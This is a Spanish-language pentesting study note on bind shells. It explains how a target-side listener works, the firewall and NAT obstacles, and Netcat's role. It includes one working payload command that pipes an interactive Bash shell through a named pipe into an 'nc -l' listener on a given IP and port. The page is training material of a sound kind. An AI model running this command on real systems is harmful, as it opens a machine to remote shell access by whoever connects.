---
{"-publish":true,"permalink":"/penetration-tester-path/bind-shells/","PassFrontmatter":true}
---


En muchos casos, trabajaremos para establecer un `Shell` en un sistema de red local o remota. Esto significa que usaremos el emulador de terminal en nuestra *máquina de ataque local* para controlar el sistema remoto a través de su Shell. Esto normalmente se hace usando un `Bind` y/o una `Reverse` Shell.

## Qué es?

Con un Shell de enlace, el sistema de destino tiene un oyente iniciado y espera una conexión del sistema de un Pentester (attack box).

![Pasted image 20250615055557.png](/img/user/Pasted%20image%2020250615055557.png)
Como se ve en la imagen, nos conectaríamos directamente con la`dirección IP` y el puerto de escucha del objetivo. Obtener un Shell de esta manera puede presentar varios desafíos. Algunos a considerar:

- Tendría que haber un oyente que ya haya empezado a trabajar en el objetivo.
- Si no hay ningún oyente iniciado, necesitaremos encontrar una forma de hacer que esto suceda.
- Los administradores generalmente configuran reglas estrictas de firewall entrante y NAT (con implementación de PAT) en el borde de la red (orientada al público), por lo que ya necesitaríamos estar en la red interna.
- Es probable que los firewalls del sistema operativo (en Windows y Linux) bloqueen la mayoría de las conexiones entrantes que no estén asociadas con aplicaciones confiables basadas en red.

Los firewalls del sistema operativo pueden ser problemáticos al establecer un Shell, ya que necesitamos considerar las direcciones IP, los puertos y la herramienta en uso para que nuestra conexión funcione correctamente. En el ejemplo anterior, la aplicación utilizada para iniciar el oyente se llama GNU `NetCat`. **NetCat (NC)** se considera nuestro cuchillo de ejército suizo, ya que puede funcionar sobre `TCP`, `UDP`, y sockets `Unix`. Es capaz de usar `IPv4` e `IPv6`, abrir y escuchar en sockets, funcionar como un proxy e incluso tratar con la entrada y salida de texto. Usaríamos **NC** en el cuadro de ataque como nuestro cliente, y el objetivo sería el servidor.

---

![Pasted image 20250615060450.png](/img/user/Pasted%20image%2020250615060450.png)

## Establishing a Basic Bind Shell with Netcat

Hemos demostrado que podemos usar NetCat para enviar texto entre el cliente y el servidor, pero este no es un Shell de enlace porque no podemos interactuar con el sistema operativo y el sistema de archivos. Solo podemos pasar el texto dentro de la configuración de la tubería por NetCat. Usemos Netcat para servir nuestro caparazón para establecer un shell de enlace real. En el lado del servidor, necesitaremos especificar el directorio, el Shell, el oyente, trabajar con algunas canalizaciones y la redirección de entrada y salida para garantizar que se envíe un Shell al sistema cuando el cliente intente conectarse.

#### No. 1: Server - Binding a Bash shell to the TCP session

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Los comandos anteriores se consideran nuestra carga útil, la cual entregamos manualmente. Notaremos que los comandos y el código de nuestras cargas útiles variarán según el sistema operativo host al que las entreguemos.

De regreso en el cliente, use Netcat para conectarse al servidor ahora que se está sirviendo un shell en el servidor.

![Pasted image 20250615060728.png](/img/user/Pasted%20image%2020250615060728.png)

---
#Shell #bind-shell

---